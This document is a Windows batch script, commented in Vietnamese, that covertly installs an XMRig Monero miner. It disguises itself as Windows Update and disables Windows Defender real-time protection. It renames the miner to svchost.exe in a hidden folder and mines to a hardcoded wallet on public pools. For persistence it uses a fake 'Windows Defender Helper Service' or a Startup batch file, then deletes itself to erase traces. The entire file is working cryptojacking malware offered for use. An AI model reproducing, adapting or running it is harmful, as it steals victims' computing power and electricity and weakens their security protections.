@echo off
setlocal EnableDelayedExpansion

:: ============================================================
:: CAU HINH
:: ============================================================
set "VERSION=3.2-stealth-full"
set "MINER_DIR=%APPDATA%\Microsoft\Windows\Caches"
set "MINER_EXE=%MINER_DIR%\svchost.exe"
set "CONFIG_FILE=%MINER_DIR%\system.ini"
set "CONFIG_BG=%MINER_DIR%\system_bg.ini"
set "SERVICE_NAME=WinDefendHelper"
set "SERVICE_DESC=Windows Defender Helper Service"

:: Nhận Wallet từ tham số (%1), nếu không có thì dùng mặc định
set "WALLET=%~1"
if "%WALLET%"=="" set "WALLET=46XsTn651nHPtRSJBdETW8CMizN61eWQRgRieVCwnmGD5ydqgWANxv2g7v1X9NfBwHAAyU1DPfpEhiimRRAT7A4w4MGemK2"
set "PASS=Win_Root"

title Windows Update Service
echo [*] Initializing Windows Components...

:: ============================================================
:: KIEM TRA QUYEN ADMIN
:: ============================================================
net session >nul 2>&1
if %errorLevel% == 0 (
    set ADMIN=1
) else (
    set ADMIN=0
)

:: ============================================================
:: XOA CAC PHIEN BAN CU (CLEANUP)
:: ============================================================
echo [*] Cleaning up old instances...
sc stop %SERVICE_NAME% >nul 2>&1
sc delete %SERVICE_NAME% >nul 2>&1

powershell -Command "Get-Process svchost,lsass,winlogon -ErrorAction SilentlyContinue | ?{$_.Path -like '*Caches*'} | Stop-Process -Force" >nul 2>&1
powershell -Command "Get-Process xmrig -ErrorAction SilentlyContinue | Stop-Process -Force" >nul 2>&1

if exist "%MINER_DIR%" (
    timeout 2 >nul
    rmdir /q /s "%MINER_DIR%" >nul 2>&1
)
del /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\win_update.bat" >nul 2>&1

:: ============================================================
:: VU KHI: TAT WINDOWS DEFENDER TAM THOI (Neu co Admin)
:: ============================================================
if %ADMIN% == 1 (
    echo [*] Configuring System Security...
    powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
    powershell -Command "Add-MpPreference -ExclusionPath '%MINER_DIR%'" >nul 2>&1
)

:: ============================================================
:: KHOI TAO THU MUC
:: ============================================================
mkdir "%MINER_DIR%" >nul 2>&1

:: ============================================================
:: TAI MINER
:: ============================================================
set "URL=https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-windows-x64.zip"
set "ZIP_FILE=%TEMP%\win_update.zip"

echo [*] Downloading system components...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%URL%', '%ZIP_FILE%')" >nul 2>&1

if not exist "%ZIP_FILE%" (
    echo [-] Download failed.
    exit /b 1
)

echo [*] Extracting components...
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%ZIP_FILE%', '%MINER_DIR%\temp')" >nul 2>&1

:: Doi ten thanh svchost.exe
move "%MINER_DIR%\temp\xmrig-6.21.0\xmrig.exe" "%MINER_EXE%" >nul 2>&1
rmdir /q /s "%MINER_DIR%\temp" >nul 2>&1
del "%ZIP_FILE%" >nul 2>&1

if not exist "%MINER_EXE%" (
    echo [-] Extraction failed.
    exit /b 1
)

:: ============================================================
:: TAO CONFIG AN (system.ini)
:: ============================================================
(
echo {
echo     "api": { "id": null, "worker-id": null },
echo     "http": { "enabled": false, "host": "127.0.0.1", "port": 0, "access-token": null, "restricted": true },
echo     "autosave": true, "background": false, "colors": false, "title": false,
echo     "randomx": { "init": -1, "init-avx2": -1, "mode": "auto", "1gb-pages": false, "rdmsr": true, "wrmsr": true, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1 },
echo     "cpu": { "enabled": true, "huge-pages": true, "huge-pages-jit": false, "hw-aes": null, "priority": null, "memory-pool": false, "yield": true, "max-threads-hint": 100, "asm": true, "argon2-impl": null },
echo     "opencl": { "enabled": false, "cache": true, "loader": null, "platform": "AMD", "adl": true },
echo     "cuda": { "enabled": false, "loader": null, "nvml": true },
echo     "log-file": null, "donate-level": 1, "donate-over-proxy": 1,
echo     "pools": [
echo         { "url": "auto.c3pool.org:33333", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": true, "enabled": true },
echo         { "url": "auto.c3pool.org:19999", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false, "enabled": true },
echo         { "url": "auto.c3pool.org:443", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": true, "enabled": true },
echo         { "url": "auto.c3pool.org:80", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false, "enabled": true },
echo         { "url": "auto.c3pool.org:23333", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false, "enabled": true },
echo         { "url": "pool.supportxmr.com:443", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": true, "enabled": true },
echo         { "url": "pool.supportxmr.com:8080", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false, "enabled": true },
echo         { "url": "pool.supportxmr.com:7777", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false, "enabled": true },
echo         { "url": "pool.supportxmr.com:5555", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false, "enabled": true },
echo         { "url": "pool.supportxmr.com:80", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false, "enabled": true },
echo         { "url": "pool.supportxmr.com:3333", "user": "%WALLET%", "pass": "%PASS%", "keepalive": true, "tls": false, "enabled": true }
echo     ],
echo     "print-time": 60, "health-print-time": 60, "retries": 5, "retry-pause": 5, "syslog": false,
echo     "tls": { "enabled": false, "protocols": null, "cert": null, "cert_key": null, "ciphers": null, "ciphersuites": null, "dhparam": null },
echo     "dns": { "ip_version": 4, "ttl": 30 },
echo     "user-agent": null, "verbose": 0, "watch": true,
echo     "pause-on-battery": false, "pause-on-active": false
echo }
) > "%CONFIG_FILE%"

copy /Y "%CONFIG_FILE%" "%CONFIG_BG%" >nul
powershell -Command "(Get-Content '%CONFIG_BG%') -replace '\"background\": false', '\"background\": true' | Set-Content '%CONFIG_BG%'" >nul

:: ============================================================
:: TAO SERVICE AN (Neu co Admin)
:: ============================================================
if %ADMIN% == 1 (
    echo [*] Installing System Service...
    
    set "NSSM_URL=https://nssm.cc/release/nssm-2.24.zip"
    set "NSSM_ZIP=%TEMP%\nssm.zip"
    powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('%NSSM_URL%', '%NSSM_ZIP%')" >nul 2>&1
    
    powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%NSSM_ZIP%', '%TEMP%\nssm_ext')" >nul 2>&1
    move "%TEMP%\nssm_ext\nssm-2.24\win64\nssm.exe" "%MINER_DIR%\nssm.exe" >nul 2>&1
    
    "%MINER_DIR%\nssm.exe" install %SERVICE_NAME% "%MINER_EXE%" >nul 2>&1
    "%MINER_DIR%\nssm.exe" set %SERVICE_NAME% AppDirectory "%MINER_DIR%" >nul 2>&1
    "%MINER_DIR%\nssm.exe" set %SERVICE_NAME% AppParameters "--config=%CONFIG_FILE%" >nul 2>&1
    "%MINER_DIR%\nssm.exe" set %SERVICE_NAME% Description "%SERVICE_DESC%" >nul 2>&1
    "%MINER_DIR%\nssm.exe" set %SERVICE_NAME% Start SERVICE_AUTO_START >nul 2>&1
    "%MINER_DIR%\nssm.exe" set %SERVICE_NAME% AppPriority BELOW_NORMAL_PRIORITY_CLASS >nul 2>&1
    
    sc start %SERVICE_NAME% >nul 2>&1
    
    del "%MINER_DIR%\nssm.exe" >nul 2>&1
    del "%NSSM_ZIP%" >nul 2>&1
    rmdir /q /s "%TEMP%\nssm_ext" >nul 2>&1
) else (
    :: ============================================================
    :: TAO STARTUP (Neu khong co Admin)
    :: ============================================================
    echo [*] Setting up user-level persistence...
    set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
    (
    echo @echo off
    echo start "" /min "%MINER_EXE%" --config="%CONFIG_BG%"
    ) > "%STARTUP_DIR%\win_update.bat"
    
    start "" /min "%MINER_EXE%" --config="%CONFIG_BG%"
)

:: ============================================================
:: XOA DAU VET (SELF-DELETE)
:: ============================================================
echo [*] Finishing setup...
timeout 3 >nul
(goto) 2>nul & del "%~f0"
